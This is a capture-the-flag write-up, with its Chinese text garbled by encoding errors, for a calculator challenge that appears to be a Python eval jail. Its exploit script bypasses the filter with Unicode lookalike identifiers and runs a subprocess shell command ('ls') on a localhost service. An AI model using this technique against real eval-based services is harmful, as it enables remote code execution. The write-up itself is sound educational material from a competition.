# Tongji/åŒæµ MH-12åœ°æ‘Šç¥å™¨æ‘†æ‘Šè®¡ç®—å™¨åŠå…¬æ–‡å…·ç”¨å“è´¢åŠ¡ç”¨é“¶è¡Œç”¨äººäº‹ç”¨ä¼šè®¡å­¦ç”Ÿå•†åŠ¡é€ç¤¼å¤ªé˜³èƒ½è®¡ç®—å™¨

## é¢˜é¢

by *Nemo*

TongjiCTF ç»„å§”ä¼šå¾ˆè‡ªè±ªåœ°åœ¨ [TongjiWIZ fx-991CN X](https://github.com/Cat-Training-Force/Tongji-CTF-2023/tree/main/Misc/%E5%A4%A9%E7%8B%97%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8) ä¹‹åç»™ä½ å¸¦æ¥ä»–ä»¬çš„å…¨æ–°åŠ›ä½œï¼šTongji/åŒæµ MH-12åœ°æ‘Šç¥å™¨æ‘†æ‘Šè®¡ç®—å™¨åŠå…¬æ–‡å…·ç”¨å“è´¢åŠ¡ç”¨é“¶è¡Œç”¨äººäº‹ç”¨ä¼šè®¡å­¦ç”Ÿå•†åŠ¡é€ç¤¼å¤ªé˜³èƒ½è®¡ç®—å™¨ï¼æˆ‘ä»¬ä¿ç•™äº†å®ƒçš„ç²¾é«“ï¼Œé‚£å°±æ˜¯ï¼š

å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶å½’é›¶

## æ€è·¯

[PEP](https://peps.python.org/pep-0672/) [è°·æ­Œåº”è¯¥èƒ½æŸ¥åˆ°çš„ä¸œè¥¿](https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/how-to-solve-a-pyjail.md) [Python Documentation](https://docs.python.org/3/howto/unicode.html)

æ‰€ä»¥ä½ åªè¦ç”¨ Unicode å»ç»•å°±å®Œäº‹äº†ã€‚

å†™ä¸€ä¸ª eval çš„ payloadï¼Œç„¶åç”¨ Unicode æ›¿æ¢æ‰ eval å°±è¡Œäº†ã€‚

## Exploit

```python
import requests

def main():
    url = 'http://localhost:1338/'
    while True:
        expression = input('expression? > ')
        if expression == 'exit':
            break
        if expression == 'exp':
            base = '__import__("subprocess").check_output("ls", shell=True)'
            base_chr_int = [ord(i) for i in base]
            # expression = r'ğ“®ğ“¿ğ“ªğ“µ(ğ•”ğ•™ğ•£(105) + ğ•”ğ•™ğ•£(109) + ğ•”ğ•™ğ•£(112) + ğ•”ğ•™ğ•£(111) + ğ•”ğ•™ğ•£(114) + ğ•”ğ•™ğ•£(116) + ğ•”ğ•™ğ•£(32) + ğ•”ğ•™ğ•£(111) + ğ•”ğ•™ğ•£(115));ğ“°ğ“®ğ“½ğ“ªğ“½ğ“½ğ“»(ğ¨ğ¬, ğ•”ğ•™ğ•£(115) + ğ•”ğ•™ğ•£(121) + ğ•”ğ•™ğ•£(115) + ğ•”ğ•™ğ•£(116) + ğ•”ğ•™ğ•£(101) + ğ•”ğ•™ğ•£(109))(ğ•”ğ•™ğ•£(108) + ğ•”ğ•™ğ•£(115))'
            expression = f'ğ“®ğ“¿ğ“ªğ“µ({"+".join([f"ğ•”ğ•™ğ•£({i})" for i in base_chr_int])})'
        data = {'expression': expression}
        r = requests.post(url + 'calc', json=data)
        print(r.json()["result"])
        
if __name__ == '__main__':
    main()
```


